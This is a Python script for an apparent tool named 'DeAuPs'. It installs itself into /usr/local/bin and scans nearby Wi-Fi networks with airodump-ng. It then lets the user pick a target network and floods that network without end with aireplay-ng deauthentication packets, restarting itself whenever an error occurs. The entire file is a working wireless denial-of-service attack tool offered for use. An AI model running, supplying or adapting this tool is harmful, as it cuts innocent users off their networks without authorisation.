import subprocess, time, sys, argparse, inquirer, re, random, string, os







project = {}

red = "\033[1;31m"

green = "\033[1;32m"

yellow = "\033[1;33m"

blue = "\033[1;34m"

run = lambda cmd : subprocess.run( cmd, shell = True, check = True )

dream = lambda TIME : time.sleep( TIME )

uniqueName = lambda : f"DeAuPs-{ ''.join( random.choice( string.ascii_uppercase + string.ascii_lowercase + string.digits + '-_' ) for x in range( int( 5 ) ) ) }"

deleteDir = lambda : run( f"rm -rf ./{ project[ 'dirName' ] }" )

targetName = lambda nameOptionsList : inquirer.prompt( [ inquirer.List( "option", message = "Choose a target name", choices = nameOptionsList ) ] )[ "option" ]

nameOptions = lambda : [ x.strip() for x in [ [ x.strip() for x in open( f"./{ project[ 'dirName' ] }/wifiNames.py", "r" ).readlines() ] ][ 0 ] if x.strip() != "" ]

collectWifiNames = lambda : run( "sudo awk -F ',' '{ if ($1 ~ /Station/ || $1 ~ /BSSID/) next; print $%s }' ./%s/captureFile-02.csv | sort -u > ./%s/wifiNames.py" % ( getColumnNumber()[ "essidColumnNumber" ], project[ "dirName" ], project[ "dirName" ] ) )









def waiting( t = 15 ):

    sTime = time.time()

    length = 30

    while time.time() - sTime <= t:

        eTime = time.time() - sTime

        p = eTime / t

        if t == 15:

            line = f"\r{ green }Capturing wireless networks and informations: { '-' * int( length * p ):{ length }s} { int( p * 101 ) }%"

        else:

            line = f"\r{ green }To restart : { int( p * 101 ) }%"

        sys.stdout.write( line )

        sys.stdout.flush()

        time.sleep( 0.1 )









def install():

    try:

        run( "sudo touch ./deaups && sudo echo -e '#! /bin/bash\\npython3 /usr/local/bin/install.py \"$@\"' > ./deaups && sudo chmod +x ./deaups && sudo mv ./deaups /usr/local/bin/ && sudo mv ./install.py /usr/local/bin/" )

    except:

        print( f"{ blue }\nError in installation.\n" )

        sys.exit( 0 )









def checkDirLocation():

    try:

        location1 = subprocess.check_output( "ls /usr/local/bin/ | grep 'deaups'", shell = True, encoding = "utf-8" ).strip()

        location2 = subprocess.check_output( "ls /usr/local/bin/ | grep 'install.py'", shell = True, encoding = "utf-8" ).strip()

        if location1 and location2:

            return( True )

    except:

        return( False )









def getColumnNumber():

    smallProject = {}

    for x in [ y for y in range( 0, 20 ) ]:

        try:

            process = subprocess.Popen( "grep -i 'beacons.*channel\\|channel.*beacons' ./%s/captureFile-02.csv | head -n 1 | awk -F ',' '{ print $%s }'" % ( project[ "dirName" ], x ), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE )

            output, _ = process.communicate()

            if _ != b"":

                getColumnNumber()

            output = output.decode( "utf-8" ).strip()

            if output.lower() == "bssid":

                smallProject[ "bssidColumnNumber" ] = x

            elif output.lower() == "channel":

                smallProject[ "channelColumnNumber" ] = x

            elif output.lower() == "essid":

                smallProject[ "essidColumnNumber" ] = x

        except:

            getColumnNumber()

        finally:

            process.terminate()

            process.wait()

    if len( smallProject ) == 3:

        return( smallProject )

    else:

        getColumnNumber()









def startDeAuth():

    file = open( f"./{ project[ 'dirName' ] }/deauthErrorReader.py", "w" )

    print( f"\n\n{ yellow }Attacking { project[ 'name' ] }" )

    process = subprocess.Popen( [ "sudo", "aireplay-ng", "-0", "0", "-a", project[ "bssid" ], project[ "interface" ] ], stdout = file, stderr = subprocess.PIPE )

    dream( 25 )

    process.terminate()

    process.wait()

    file.close()

    try:

        file1 = open( f"./{ project[ 'dirName' ] }/deauthErrorReader.py", "r" )

        text1 = file1.read().strip()

        file1.close()

        searching1 = re.findall( r"but the AP uses channel (\S+)", text1, re.IGNORECASE )

        if len( searching1 ) == 0:

            print( f"{ green }Access point uses the right channel." )

        else:

            print( f"\n{ blue }Channel reconfiguration to { searching1[ 0 ] }\n" )

            project[ "channel" ] = searching1[ 0 ]

            configChannel()

        file2 = open( f"./{ project[ 'dirName' ] }/deauthErrorReader.py", "r" )

        text2 = file2.read().strip()

        file2.close()

        searching2 = re.findall( r"No such BSSID available", text2, re.IGNORECASE )

        if len( searching2 ) == 0:

            print( f"{ green }The BSSID found." )

        else:

            print( f"\n{ blue }Channel is missing. The wifi may be turned off!\n" )

            deleteDir()

            dream( 2 )

            start( restart = True )

    except:

        deleteDir()

        dream( 2 )

        start( restart = True )

    waiting( 50 )

    startDeAuth()









def configChannel():

    try:

        run( f"sudo iwconfig { project[ 'interface' ] } channel { project[ 'channel' ] }" )

    except:

        print( f"\n{ blue }Wifi may be turned off!\n" )

        deleteDir()

        dream( 2 )

        start( restart = True )









def getTargetChannel():

    run( "sudo grep -i '%s' ./%s/captureFile-02.csv | head -n 1 | awk -F ',' '{ print $%s }' > ./%s/targetChannel.py" % ( project[ "name" ], project[ "dirName" ], getColumnNumber()[ "channelColumnNumber" ], project[ "dirName" ] ) )

    dream( 0.2 )

    try:

        file = open( f"./{ project[ 'dirName' ] }/targetChannel.py", "r" )

        channel = file.read().strip()

        file.close()

        return( channel )

    except:

        deleteDir()

        dream( 2 )

        start( restart = True )









def getTargetBssid():

    run( "sudo grep -i '%s' ./%s/captureFile-02.csv | head -n 1 | awk -F ',' '{ print $%s }' > ./%s/targetBssid.py" % ( project[ "name" ], project[ "dirName" ], getColumnNumber()[ "bssidColumnNumber" ], project[ "dirName" ] ) )

    dream( 0.2 )

    try:

        file = open( f"./{ project[ 'dirName' ] }/targetBssid.py", "r" )

        BSSID = file.read().strip()

        file.close()

        return( BSSID )

    except:

        deleteDir()

        dream( 2 )

        start( restart = True )









def createCaptureFiles():

    file = open( f"./{ project[ 'dirName' ] }/captureFile-01.csv", "w" )

    process = subprocess.Popen( [ "sudo", "airodump-ng", "-w", f"./{ project[ 'dirName' ] }/captureFile", "--output-format", "csv", project[ "interface" ] ], stdout = file )

    waiting()

    file.close()

    process.terminate()

    process.wait()









def createDir():

    dirName = uniqueName()

    if os.path.exists( dirName ):

        createDir()

    run( f"sudo mkdir ./{ dirName }" )

    if os.path.exists( dirName ):

        project[ "dirName" ] = dirName

    else:

        createDir()









def start( restart = False ):

    try:

        createDir()

        createCaptureFiles()

        collectWifiNames()

        if restart == False:

            project[ "name" ] = targetName( nameOptions() )

        if len( getTargetBssid() ) == 17 and len( re.findall( r"-", getTargetChannel(), re.IGNORECASE ) ) == 0:

            project[ "bssid" ] = getTargetBssid()

            project[ "channel" ] = getTargetChannel()

        else:

            deleteDir()

            dream( 2 )

            start( restart = True )

        configChannel()

        startDeAuth()

    except:

        deleteDir()

        dream( 2 )

        start( restart = True )









def main():

    if checkDirLocation() == True:

        createOption = argparse.ArgumentParser( description = "How to use?" )

        createOption.add_argument( "-i", "--interface", type = str, required = True, help = "Network interface" )

        option = createOption.parse_args()

        project[ "interface" ] = option.interface

        run( "sudo clear" )

        print( f"""{ green }

  __  ___ _       __  __ 
 /  )(_  /_| /  //__)(   
/(_/ /__(  |(__//   __)  
𝒯𝒽ℯ 𝓇ℯ𝓁𝒾𝒶𝒷𝓁ℯ                         


    """ )

        start()

    else:

        install()

        print( f'\n\n{ green }Run "\033[1mdeaups -i <interface>\033[0m"\n\n' )

        sys.exit( 0 )











if __name__ == "__main__":

    main()


















